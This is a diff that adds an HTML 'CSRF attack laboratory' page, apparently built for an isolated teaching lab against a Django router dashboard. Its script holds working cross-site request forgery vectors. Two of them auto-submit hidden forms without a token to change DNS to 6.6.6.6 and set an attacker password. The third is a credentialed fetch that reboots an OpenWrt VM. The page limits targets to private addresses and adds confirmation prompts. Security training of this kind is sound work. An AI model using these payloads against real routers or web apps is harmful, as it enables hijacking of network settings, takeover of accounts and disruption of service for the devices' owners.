@@ -1,0 +1,51 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>CSRF Attack Laboratory</title>
+  <style>
+    :root{color-scheme:dark;--bg:#090d14;--panel:#121a26;--line:#2b394b;--text:#edf3fb;--muted:#91a0b4;--red:#ff647c;--blue:#44b8ff}
+    *{box-sizing:border-box}body{margin:0;background:radial-gradient(circle at 80% 0,#301b2a,transparent 35%),var(--bg);color:var(--text);font:14px/1.5 system-ui,sans-serif}
+    main{width:min(850px,92%);margin:50px auto}.badge{display:inline-block;padding:5px 9px;border-radius:5px;background:#4d202b;color:#ff9cab;font-weight:700;font-size:11px}h1{font-size:36px;margin:10px 0}p{color:var(--muted)}
+    .notice,.card{border:1px solid var(--line);border-radius:12px;background:var(--panel);padding:20px}.notice{border-color:#68404a;margin:25px 0}.grid{display:grid;grid-template-columns:repeat(3,1fr);gap:14px;margin-top:20px}.card h2{font-size:17px}.card code{color:var(--blue)}label{display:block;font-weight:600}input{display:block;width:100%;margin-top:7px;padding:12px;border:1px solid var(--line);border-radius:7px;background:#080d14;color:white}
+    button{width:100%;padding:10px;border:0;border-radius:7px;background:var(--red);color:white;font-weight:700;cursor:pointer}.output{margin-top:20px;padding:14px;border-left:3px solid var(--blue);background:#101923;color:var(--muted)}iframe{width:100%;height:100px;margin-top:15px;border:1px solid var(--line);background:white}@media(max-width:700px){.grid{grid-template-columns:1fr}}
+  </style>
+</head>
+<body><main>
+  <span class="badge">ISOLATED LAB ONLY</span>
+  <h1>CSRF attack laboratory</h1>
+  <p>This page must be opened from a different site than the victim Django dashboard.</p>
+  <div class="notice"><strong>Authorization reminder</strong><p>Only target the private VirtualBox lab that you own. V3 can reboot the actual OpenWrt VM when C0 is active.</p></div>
+  <label>Victim Django origin
+    <input id="target" value="http://192.168.56.1:8000" placeholder="http://192.168.56.1:8000">
+  </label>
+  <div class="grid">
+    <section class="card"><small>VECTOR 1</small><h2>DNS form POST</h2><p>Targets <code>/dns</code> without a CSRF token.</p><button data-path="/dns" data-field="dns" data-value="6.6.6.6">Launch V1</button></section>
+    <section class="card"><small>VECTOR 2</small><h2>Password form POST</h2><p>Targets <code>/passwd</code> without a CSRF token.</p><button data-path="/passwd" data-field="password" data-value="attacker-password">Launch V2</button></section>
+    <section class="card"><small>VECTOR 3</small><h2>Fetch reboot</h2><p>Targets the real <code>/reboot</code> handler.</p><button id="reboot">Launch V3</button></section>
+  </div>
+  <div class="output" id="output">No vector launched. Record target state before starting.</div>
+  <form id="attack-form" method="post" target="attack-result"></form>
+  <iframe name="attack-result" title="Form attack response"></iframe>
+</main>
+<script>
+function target(){
+  const value=document.querySelector("#target").value.trim().replace(/\/$/,"");
+  if(!/^https?:\/\/(localhost|127\.0\.0\.1|10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.)/i.test(value))throw Error("Target must be localhost or an RFC1918 private lab address.");
+  return value;
+}
+function message(text){document.querySelector("#output").textContent=new Date().toLocaleTimeString()+" — "+text}
+document.querySelectorAll("[data-path]").forEach(button=>button.onclick=()=>{
+  try{
+    const form=document.querySelector("#attack-form");form.action=target()+button.dataset.path;form.replaceChildren();
+    const input=document.createElement("input");input.type="hidden";input.name=button.dataset.field;input.value=button.dataset.value;form.append(input);
+    form.submit();message(button.dataset.path+" form submitted without token. Inspect iframe, Django log, and /api/status.");
+  }catch(error){message(error.message)}
+});
+document.querySelector("#reboot").onclick=async()=>{
+  if(!confirm("V3 can reboot the real OpenWrt VM in C0. Continue?"))return;
+  try{await fetch(target()+"/reboot",{method:"POST",credentials:"include",mode:"no-cors"});message("/reboot fetch dispatched. Verify router reachability and Django logs.")}
+  catch(error){message("Browser blocked or failed the fetch: "+error.message)}
+};
+</script></body></html>
